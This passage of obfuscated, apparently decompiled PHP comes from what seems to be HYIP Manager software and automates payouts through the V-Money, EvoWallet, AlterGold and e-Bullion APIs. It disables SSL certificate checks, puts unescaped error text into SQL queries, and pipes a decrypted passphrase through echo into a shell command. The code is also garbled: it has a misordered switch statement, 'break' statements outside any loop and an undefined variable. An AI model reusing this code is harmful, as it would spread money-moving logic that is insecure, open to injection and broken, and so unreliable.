        $elnlcKIydR = "<Request>\r\n\t<Type>Transfer</Type>\r\n\t<Auth>\r\n\t\t<AccountId>".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcztSyn']], ENT_NOQUOTES )."</AccountId>\r\n\t\t<Token>{$elnlcuLEl}</Token>\r\n\t</Auth>\r\n\t<Transfers>\r\n\t\t<Transfer>\r\n\t\t\t<ID>1</ID>\r\n\t\t\t<Payee>".htmlentities( $elnlcJfxRK, ENT_NOQUOTES )."</Payee>\r\n\t\t\t<Amount>".htmlentities( $elnlcekLao, ENT_NOQUOTES )."</Amount>\r\n\t\t\t<Memo>".htmlentities( $elnlcykqSE, ENT_NOQUOTES )."</Memo>\r\n\t\t</Transfer>\r\n\t</Transfers>\r\n        </Request>";
        $elnlcVCFRQ = curl_init( );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://www.v-money.net/vai.php" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "request_data=".$elnlcKIydR );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcVRAGE = elnlcojdm( $a );
        if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcJdcEW'] )
        {
            return array( 1, "", $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] );
        }
        else
        {
            if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcMcIo'] )
            {
                $e = elnlcdjxb( "{$elnlcstWo} ".$elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcmrzn( $elnlcuHrM )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = array( );
    $elnlcGrmU = elnlcskkt( $elnlcuHrM, "response" );
    if ( $elnlcGrmU != "" )
    {
        $elnlcvzPA = $elnlcGrmU;
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = elnlcskkt( $elnlcvzPA, "status" );
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcskkt( $elnlcAhtVm, "statusmsg" );
        $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] = elnlcskkt( $elnlcvzPA, "batch" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcdMRao']] = elnlcskkt( $elnlcvzPA, "fromaccount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcnhDqm']] = elnlcskkt( $elnlcvzPA, "toaccount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcskkt( $elnlcvzPA, "amount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclmhFR']] = elnlcskkt( $elnlcvzPA, "currency" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcmCml']] = elnlcskkt( $elnlcvzPA, "checksum" );
        if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == 0 )
        {
            $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcgyewH'];
        }
    }
    if ( 0 < $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] )
    {
        switch ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] )
        {
            case 10310 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10310: Invalid Account Prefix";
                break;
            case 10311 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10311: Payer account has been suspended";
                break;
            case 10312 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10312: API transfer disabled";
                break;
            case 10313 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10313: Payee account not found";
                break;
            case 10314 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10314: Payer spending over daily limit";
                break;
            case 10315 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10315: Payee account has been suspended";
                break;
            case 10316 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10316: Payee account has been limited";
                break;
            case 10317 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10317: Spending less than minimum allowed";
                break;
            case 10318 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10318: Payee will reach their balance limit";
                break;
            case 10319 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10319: Payer do not have enough funds";
                break;
            case 10320 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10320: Payee has an invalid balance security check";
                break;
            case 10321 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10321: Spend was not complete";
                break;
            case 10322 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10322: Payee account group not found";
                break;
            case 10323 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10323: Invalid payee account";
                break;
            case 10324 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10324: Invalid IP range";
                break;
            case 10325 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10325: Invalid API or not enabled";
                break;
            case 10326 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10326: Payer account group not found";
                break;
            case 10327 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10327: Invalid payer account";
                break;
            case 10328 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10328: Invalid checksum";
                break;
            case 10110 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10110: Invalid Account Prefix";
                break;
            case 10111 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10111: Account has been suspended";
                break;
            case 10112 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10112: Invalid API or API not enabled";
                break;
            case 10113 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10113: API balance query disabled";
                break;
            case 10114 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10114: IP not in the allowed range";
                break;
            case 10115 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10115: Balance can not be retrieved";
                break;
            case 10116 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10116: Reserve";
                break;
            case 10117 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10117: Account group not found";
                break;
            case 10118 :
                $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10118: This account can not be found";
                break;
            case 10119 :
        }
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = "10119: Invalid Checksum";
        break;
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcdvIfH'];
    }
    return $elnlcVRAGE;
}

function elnlcfhhnb( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo, $elnlcJKDjL = "USD" )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty EvoWallet account.'";
        mysql_query( $q );
        return array( 0, "Invalid EvoWallet account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 24 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 24 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='evowallet_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcJFOd = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
            $elnlcaFAua = $elnlctVnzQ[$elnlcbhAzL['elnlcTthx']];
        }
        else
        {
            $elnlcaFAua = preg_split( "/\\|/", $elnlcDxIpr )[1];
            $elnlcJFOd = preg_split( "/\\|/", $elnlcDxIpr )[0];
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcqsmQl = date( $elnlcbhAzL['elnlcGTQPV'] );
        $elnlcilUnk = strtoupper( md5( $elnlcaFAua.$elnlcqsmQl."103"."".$elnlcJKDjL.$elnlctVnzQ[$elnlcbhAzL['elnlcDQQP']].$elnlcJfxRK.$elnlcekLao.md5( $elnlcJFOd ) ) );
        $elnlcKIydR = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<request>\r\n<apiname>".htmlentities( $elnlcaFAua, ENT_NOQUOTES )."</apiname>\r\n<trandate>".$elnlcqsmQl."</trandate>\r\n<trantype>103</trantype>\r\n<tranid></tranid>\r\n<curcode>".$elnlcJKDjL."</curcode>\r\n<fromaccount>".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcDQQP']], ENT_NOQUOTES )."</fromaccount>\r\n<toaccount>".htmlentities( $elnlcJfxRK, ENT_NOQUOTES )."</toaccount>\r\n<amount>".htmlentities( $elnlcekLao, ENT_NOQUOTES )."</amount>\r\n<memo>".htmlentities( $elnlcykqSE, ENT_NOQUOTES )."</memo> \r\n<checksum>".$elnlcilUnk."</checksum> \r\n</request>";
        $elnlcVCFRQ = curl_init( );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://www.evowallet.com/api.php?req=".urlencode( $elnlcKIydR ) );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcVRAGE = elnlcmrzn( $a );
        if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcJdcEW'] )
        {
            return array( 1, "", $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] );
        }
        else
        {
            if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcMcIo'] )
            {
                $e = elnlcdjxb( "{$elnlcstWo} ".$elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']]."<br>".$elnlcVRAGE[$elnlcbhAzL['elnlcARIU']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcjfec( $elnlcLrAM, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to AlterGold account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid AlterGold account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 17 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 17 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcLrAM == "" )
        {
            $q = "select v from hm2_pay_settings where n='altergold_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcJMHJD = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlcJMHJD = $elnlcLrAM;
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://api.altergold.com/spend.php" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "PAYER_ACCOUNT=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcCJKK']] )."&PAYER_PASSWORD=".rawurlencode( $elnlcJMHJD )."&PAYEE_ACCOUNT=".rawurlencode( $elnlcJfxRK )."&PAYMENT_AMOUNT=".rawurlencode( $elnlcekLao )."&PAYMENT_CURRENCY=USD&MEMO={$elnlcykqSE}" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        if ( $a == "" )
        {
            print "Blank response from Altergold processor service.";
        }
        else
        {
            $elnlcvzAej = array( "E10011" => "Unable to Login as Payer. This means wrong login information was provided.", "E10012" => "Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.", "E10013" => "API Automated Spends not Enabled.", "E10014" => "Unable to authorize IP address.", "E10015" => "Recipient account not found", "E10016" => "Recipient account is suspended.", "E10017" => "Invalid spend units.", "E10018" => "Spend amount is too low.", "E10019" => "Recipient reached balance limit.", "E10020" => "Not enough funds.", "E10021" => "* Please contact support." );
            if ( $elnlcvzAej[$a] != "" )
            {
                $e = elnlcdjxb( "{$elnlcstWo} {$elnlcvzAej[$a]}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." {$elnlcvzAej[$a]}", "" );
            }
            else
            {
                return array( 1, "", $a );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcfiih( $elnlcjLVvG, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo, $elnlcJwMUI )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to e-Bullion account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid e-Bullion account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 5 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 5 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        $elnlcAbgnu = "<atip.batch.v1><payment.list>";
        $elnlcAbgnu = $elnlcAbgnu."<payment>";
        $elnlcAbgnu = $elnlcAbgnu."<payer>".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcxwpm']], ENT_NOQUOTES )."</payer>";
        $elnlcAbgnu = $elnlcAbgnu."<payee>".htmlentities( $elnlcJfxRK, ENT_NOQUOTES )."</payee>";
        $elnlcAbgnu = $elnlcAbgnu."<amount>".htmlentities( $elnlcekLao, ENT_NOQUOTES )."</amount>";
        $elnlcAbgnu = $elnlcAbgnu."<metal>".( $elnlcJwMUI == 5 ? 1 : 3 )."</metal>";
        $elnlcAbgnu = $elnlcAbgnu."<unit>1</unit>";
        $elnlcAbgnu = $elnlcAbgnu."<memo>".htmlentities( $elnlcykqSE, ENT_NOQUOTES )."</memo>";
        $elnlcAbgnu = $elnlcAbgnu."<ref></ref>";
        $elnlcAbgnu = $elnlcAbgnu."</payment>";
        $elnlcAbgnu = $elnlcAbgnu."</payment.list></atip.batch.v1>";
        $elnlcshzK = tempnam( "./tmpl_c/", "in." );
        $elnlcxHmA = tempnam( "./tmpl_c/", "out." );
        $elnlcTzKU = fopen( $elnlcshzK, $elnlcbhAzL['elnlcQLIgw'] );
        fwrite( $elnlcTzKU, $elnlcAbgnu );
        fclose( $elnlcTzKU );
        $elnlcuzos = "./tmpl_c/";
        $elnlcjVGP = escapeshellcmd( $elnlctVnzQ[$elnlcbhAzL['elnlcTpgit']] );
        $elnlcFcJr = elnlczrwm( $elnlctVnzQ[$elnlcbhAzL['elnlcqvae']], $elnlcbhAzL['elnlcBJyh'] );
        $elnlcwPgwd = $elnlctVnzQ[$elnlcbhAzL['elnlczoWB']];
        $elnlcIbuKc = " --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir {$elnlcuzos} --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0";
        $elnlcJvkDr = "echo '{$elnlcFcJr}' | {$elnlcjVGP} {$elnlcIbuKc} --recipient A20077\\@e-bullion.com --local-user ".$elnlctVnzQ[$elnlcbhAzL['elnlcxwpm']]."\\@e-bullion.com --output {$elnlcxHmA} --sign --encrypt {$elnlcshzK} 2>&1";
        $elnlcQGVA = "";
        $elnlclfiDM = popen( "{$elnlcJvkDr}", "r" );
        while ( !feof( $elnlclfiDM ) )
        {
            $elnlcQGVA = fgets( $elnlclfiDM, 4096 );
        }
        pclose( $elnlclfiDM );
        $elnlcTzKU = fopen( $elnlcxHmA, $elnlcbhAzL['elnlcJwwoe'] );
        $elnlcmbzFa = fread( $elnlcTzKU, filesize( $elnlcxHmA ) );
        fclose( $elnlcTzKU );
        unlink( $elnlcshzK );
        unlink( $elnlcxHmA );
        $elnlcsddoP = "ATIP_ACCOUNT=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcxwpm']] )."&ATIP_BATCH_MSG=".rawurlencode( $elnlcmbzFa )."&ATIP_STATUS_URL=".rawurlencode( $elnlcwPgwd );
        $elnlcVCFRQ = curl_init( );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://atip.e-bullion.com/batch.php?{$elnlcsddoP}" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_HEADER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcBcuog = array( );
        $elnlcKRIoj = "";
        if ( preg_match( "/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/", $a, $elnlcBcuog ) )
        {
            $elnlcKRIoj = $elnlcBcuog[1];
        }
        $elnlcKRIoj = urldecode( $elnlcKRIoj );
        $elnlchdCzc = tempnam( "./tmpl_c/", "xml.cert." );
        $elnlcuIzD = tempnam( "./tmpl_c/", "xml.tmp." );
        $elnlcTzKU = fopen( "{$elnlcuIzD}", $elnlcbhAzL['elnlcQLIgw'] );
        fwrite( $elnlcTzKU, $elnlcKRIoj );
        fclose( $elnlcTzKU );
        $elnlcIbuKc = " --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir {$elnlcuzos} --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0";
        $elnlcJvkDr = "echo '{$elnlcFcJr}' | {$elnlcjVGP} {$elnlcIbuKc} --output {$elnlchdCzc} --decrypt {$elnlcuIzD} 2>&1";
        $elnlcQGVA = "";
        $elnlcdlul = "";
        $elnlclfiDM = popen( "{$elnlcJvkDr}", "r" );
        while ( !feof( $elnlclfiDM ) )
        {
            $elnlcQGVA = fgets( $elnlclfiDM, 4096 );
            $elnlcJgukM = strstr( $elnlcQGVA, "key ID" );
            if ( 0 < strlen( $elnlcJgukM ) )
            {
                $elnlcdlul = preg_replace( "/[\\n\\r]/", "", substr( $elnlcJgukM, 7 ) );
            }
        }
        pclose( $elnlclfiDM );
        if ( $elnlcdlul == $elnlctVnzQ[$elnlcbhAzL['elnlcyycse']] )
        {
            if ( is_file( "{$elnlchdCzc}" ) )
            {
                $elnlcTcWo = fopen( "{$elnlchdCzc}", $elnlcbhAzL['elnlcJwwoe'] );
                $elnlcuHrM = fread( $elnlcTcWo, filesize( "{$elnlchdCzc}" ) );
                fclose( $elnlcTcWo );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Can not found decrypted verification response!" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." Can not found decrypted verification response!", "" );
            }
            $elnlcKIydR = elnlcunzql( $elnlcuHrM );
            if ( $elnlcKIydR[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcJdcEW'] )
            {
                return array( 1, "", $elnlcKIydR[$elnlcbhAzL['elnlccDio']] );
            }
            else
            {
                if ( $elnlcKIydR[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcMcIo'] )
                {
                    $e = elnlcdjxb( "{$elnlcstWo} ".$elnlcKIydR[$elnlcbhAzL['elnlczSGMs']]." ".$elnlcKIydR[$elnlcbhAzL['elnlcARIU']] );
                    $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                    mysql_query( $q );
                    return array( 0, $elnlcstWo.$elnlcKIydR[$elnlcbhAzL['elnlczSGMs']]." ".$elnlcKIydR[$elnlcbhAzL['elnlcARIU']] );
                }
                else
                {
                    $e = elnlcdjxb( "{$elnlcstWo} Unknown error" );
                    $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                    mysql_query( $q );
                    return array( 0, $elnlcstWo." Unknown error", "" );
                }
            }
        }
        else
        {
            $e = elnlcdjxb( "{$elnlcstWo} Can not decrypt verification response! " );
            $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
            mysql_query( $q );
            return array( 0, $elnlcstWo." Can not decrypt verification response!", "" );
        }
        unlink( $elnlcuIzD );
        unlink( $elnlchdCzc );
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available", "" );
    }
}

function elnlcskkt( $elnlcKIydR, $elnlcrxAoG )
{
    global $elnlcbhAzL;
    $elnlcrxAoG = strtolower( $elnlcrxAoG );
    $elnlcpyHQN = strlen( $elnlcrxAoG ) + 2;
    if ( ( $elnlcwlQb = strpos( $elnlcKIydR, "<{$elnlcrxAoG}>" ) ) === false )
    {
        return "";
    }
    if ( ( $elnlcOqPq = strpos( $elnlcKIydR, "</{$elnlcrxAoG}>" ) ) === false )
    {
        return "";
    }
    $elnlcKQtm = trim( substr( $elnlcKIydR, $elnlcwlQb + $elnlcpyHQN, $elnlcOqPq - ( $elnlcwlQb + $elnlcpyHQN ) ) );
    return $elnlcKQtm;
}

function elnlcunzql( $elnlcuHrM )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = array( );
    $elnlcdWupj = elnlcskkt( $elnlcuHrM, "balanceresponse.list" );
    if ( $elnlcdWupj != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcIPfN'];
        $elnlcyCGoN = false;
        if ( ( $elnlclMnD = stristr( $elnlcdWupj, "<balance>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcdWupj ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcdWupj, "</balance>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcdWupj ) - strlen( $elnlcpQHQ );
        }
        if ( $elnlcyCGoN )
        {
            break;
        }
        else
        {
            $elnlcgFSuJ = trim( substr( $elnlcdWupj, $elnlcwlQb + 9, $elnlcOqPq - 9 ) );
            $elnlcdWupj = trim( substr( $elnlcdWupj, $elnlcOqPq + 10 ) );
            $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcskkt( $elnlcgFSuJ, "amount" );
        }
        if ( ( $elnlclMnD = stristr( $elnlcdWupj, "<balance>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcdWupj ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcdWupj, "</balance>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcdWupj ) - strlen( $elnlcpQHQ );
        }
    }
    $elnlcGrmU = elnlcskkt( $elnlcuHrM, "verified.list" );
    if ( $elnlcGrmU != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcgyewH'];
        $elnlcyCGoN = false;
        if ( ( $elnlclMnD = stristr( $elnlcGrmU, "<transaction>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcGrmU ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcGrmU, "</transaction>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcGrmU ) - strlen( $elnlcpQHQ );
        }
        if ( $elnlcyCGoN )
        {
            break;
        }
        else
        {
            $elnlcvzPA = trim( substr( $elnlcGrmU, $elnlcwlQb + 13, $elnlcOqPq - 13 ) );
            $elnlcGrmU = trim( substr( $elnlcGrmU, $elnlcOqPq + 14 ) );
            $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] = elnlcskkt( $elnlcvzPA, "id" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcnhDqm']] = elnlcskkt( $elnlcvzPA, "payee" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcdMRao']] = elnlcskkt( $elnlcvzPA, "payer" );
            $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcskkt( $elnlcvzPA, "amount" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcEFOak']] = elnlcskkt( $elnlcvzPA, "metal" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcwEnB']] = elnlcskkt( $elnlcvzPA, "unit" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcwuVzl']] = elnlcskkt( $elnlcvzPA, "memo" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcLFPv']] = elnlcskkt( $elnlcvzPA, "exchange" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcJwGmT']] = elnlcskkt( $elnlcvzPA, "fee" );
        }
        if ( ( $elnlclMnD = stristr( $elnlcGrmU, "<transaction>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcGrmU ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcGrmU, "</transaction>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcGrmU ) - strlen( $elnlcpQHQ );
        }
    }
    $elnlcDUcm = elnlcskkt( $elnlcuHrM, "failed.list" );
    if ( $elnlcDUcm != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcdvIfH'];
        $elnlcyCGoN = false;
